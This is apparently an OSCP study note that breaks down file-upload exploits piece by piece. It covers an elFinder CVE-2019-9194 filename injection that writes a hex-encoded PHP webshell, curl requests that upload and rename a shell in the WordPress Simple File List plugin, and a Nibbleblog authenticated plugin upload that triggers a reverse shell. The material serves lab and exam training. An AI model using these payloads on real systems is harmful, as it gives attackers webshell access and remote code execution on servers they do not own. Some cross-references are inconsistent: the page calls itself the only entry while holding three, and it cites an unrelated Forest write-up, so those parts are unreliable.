# File Upload Attacks, Command Breakdowns

Part of [[COMMAND BREAKDOWNS]]. Filename-based injection tricks, distinct from the file-content/extension-filter bypasses that would live in an upload form itself. No matching [[COMMAND APPENDIX]] area contains this specific technique yet, syntax lives inline in [[14. Fixing Exploits|Fixing Exploits]] directly. See [[COMMAND BREAKDOWNS]] for the entry format.

---

## elFinder CVE-2019-9194: shell metacharacter injection via the uploaded filename

**Full payload:**
```python
payload = 'SecSignal.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > SecSignal.php;echo SecSignal.jpg'
```

**Piece by piece:**
- `SecSignal.jpg` — the filename *looks* like an ordinary, harmless JPEG name, this matters for any filter that only inspects the file's apparent name/extension.
- `;` — a shell metacharacter, command separator. This is the actual vulnerability: elFinder's PHP connector eventually passes the uploaded file's name into a **shell command** (during a later image-processing step, not at upload time itself) without sanitizing it first. Anything after this `;` runs as a completely separate OS command.
- `echo 3c3f...0a | xxd -r -p > SecSignal.php` — decodes a hex string back into raw bytes and writes them to a new file. The hex decodes to `<?php system($_GET["c"]); ?>\n`, a minimal one-line PHP webshell. Hex-encoding the payload here sidesteps having to smuggle literal `<`, `?`, `$`, `"` characters through whatever escaping/quoting the filename field itself goes through on the way into the vulnerable shell command.
- `;echo SecSignal.jpg` — a second injected command, its only purpose is to make the **last** thing printed/returned by the whole malicious "filename" still look like `SecSignal.jpg`. Depending on how the connector uses the command's output afterward (e.g. logging, or constructing a response), this keeps the apparent filename looking legitimate end to end.
- **The trigger is separate from the upload.** The upload itself (`upload()` in the exploit) just gets the malicious filename stored, nothing executes yet. A **second request**, elFinder's own image-rotate command (`cmd=resize`), is what actually invokes the vulnerable shell command against that stored filename, that's the moment the injected `;echo|xxd...` segment actually runs and the webshell gets written to disk.

**Where this comes from:** documented on both **PayloadsAllTheThings**' file upload page ("Filename Vulnerabilities" section, `; sleep 10;`-style filename command injection, verified live) and **HackTricks**' file upload page (`Set filename to ; sleep 10; to test command injection`, via the GitHub source mirror since the live HackTricks site is currently paywalled). CVE-2019-9194 itself is elFinder-specific, but "attacker-controlled filename ends up inside a shell command during some later processing step, not at upload time" is a broader, reusable pattern worth checking for on any file-upload feature that does post-upload processing (thumbnailing, format conversion, virus scanning via a shelled-out CLI tool, etc).

**Where to look in the response:** the initial upload response is just JSON (`{"added":[{"hash":...}]}`), nothing suspicious visible there. The actual proof only shows up after the *second* request (the resize/rotate trigger): either an HTTP error if something went wrong, or, on success, the dropped webshell simply becomes reachable at its (now-real) filename on the next request.

🔁 **Seen in:** [[14. Fixing Exploits#Module Exercise VM #2: elFinder web application|Fixing Exploits, Module Exercise VM #2]]. Same underlying category of bug (trusting attacker-controlled input that ends up inside a shell command) as [[09. Common Web Application Attacks#9.4.1. OS Command Injection|Common Web Application Attacks, 9.4.1]], just delivered through a filename field instead of a form parameter.

#### Tags: #ElFinder #CVE20199194 #FilenameCommandInjection #HexEncoding #CommandBreakdowns

---

### WordPress Simple File List — upload curl breakdown

```bash
curl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-upload-engine.php" \
  -F "file=@shell.png;type=image/png" \
  -F "eeSFL_ID=1" \
  -F "eeSFL_FileUploadDir=/wp-content/uploads/simple-file-list/" \
  -F "eeSFL_Timestamp=1587258885" \
  -F "eeSFL_Token=<token>"
```

| Part | Meaning |
|---|---|
| `-F "file=@shell.png;type=image/png"` | Multipart upload; `@` reads the local file and `type=` sets the MIME header. |
| `-F "eeSFL_ID=1"` | Plugin list ID; normally the first configured file list. |
| `-F "eeSFL_FileUploadDir=..."` | Destination directory; omitting it can cause HTTP 500. |
| `-F "eeSFL_Timestamp=1587258885"` | Static timestamp used by this vulnerable plugin version. |
| `-F "eeSFL_Token=..."` | File-list token used for upload validation. |

**Why 500 without the fields:** the upload engine directly uses the list ID, destination, timestamp, and token from the request when building and validating the upload. Missing values can produce a PHP error instead of a clean rejection.

**Follow-up rename:**
```bash
curl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-file-engine.php" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Referer: http://$BoxIP/wp-admin/admin.php?page=ee-simple-file-list&tab=file_list&eeListID=1" \
  -d "eeSFL_ID=1&eeFileOld=shell.png&eeListFolder=/&eeFileAction=Rename|shell.php"
# eeSecurity nonce NOT required on vulnerable 4.2.2 instances
```

The literal `|` separates the action from the new filename. Verify the `.png` returns HTTP 200 before renaming, then request the resulting `.php` file to confirm execution.

#### Tags: #WordPress #SimpleFileList #FileUpload #RCE #CVE202036847 #CommandBreakdowns

---

### Nibbleblog 4.0.3 authenticated plugin upload

```bash
curl -s -b "$CookieFile" \
  -F 'plugin=my_image' \
  -F 'title=My image' \
  -F 'position=4' \
  -F 'caption=' \
  -F "image=@$PayloadFile;type=application/x-php" \
  -F 'image_resize=1' \
  -F 'image_width=230' \
  -F 'image_height=200' \
  -F 'image_option=auto' \
  "http://$BoxIP/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image" \
  -o /dev/null -w '%{http_code}\n'
curl -s "http://$BoxIP/nibbleblog/content/private/plugins/my_image/image.php"
```

| Part | Meaning |
|---|---|
| `-b "$CookieFile"` | Sends the authenticated Nibbleblog session cookie. |
| `plugin`, `title`, `position`, `caption` | Plugin configuration fields expected by the My Image handler. |
| `image=@$PayloadFile;type=application/x-php` | Reads the local PHP payload and labels the multipart part as PHP. |
| `image_resize`, `image_width`, `image_height`, `image_option` | Image-processing fields required by the plugin request. |
| `controller=plugins&action=config&plugin=my_image` | Routes the request to the authenticated plugin configuration endpoint. |
| `/content/private/plugins/my_image/image.php` | Predictable server-side filename used after upload; requesting it executes the PHP payload. |

The upload requires valid admin authentication and the My Image plugin. The response can be HTTP 200 even when the useful result is the reverse-shell callback, so verify the listener and then treat a hanging trigger request as expected behavior while the shell keeps the connection open.

**Where it comes from:** CVE-2015-6967 and Exploit-DB 38489. The underlying request was reproduced manually from the reviewed module source in [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|HTB Nibbles]].

#### Tags: #Nibbleblog #FileUpload #RCE #CVE20156967 #CommandBreakdowns

This area grows alongside the modules, currently the only entry, revisit once more file-upload-specific techniques (extension/MIME filter bypasses, polyglot files) show up in a module rather than a box writeup.
## External Resources

- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [RevShells](https://www.revshells.com/) for payload troubleshooting
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
## Why this matters for OSCP

This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.

## Related Modules

- [[MODULES/09. Common Web Application Attacks]] -- module concepts used by this hub page

## Demonstrated in box write-ups

- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
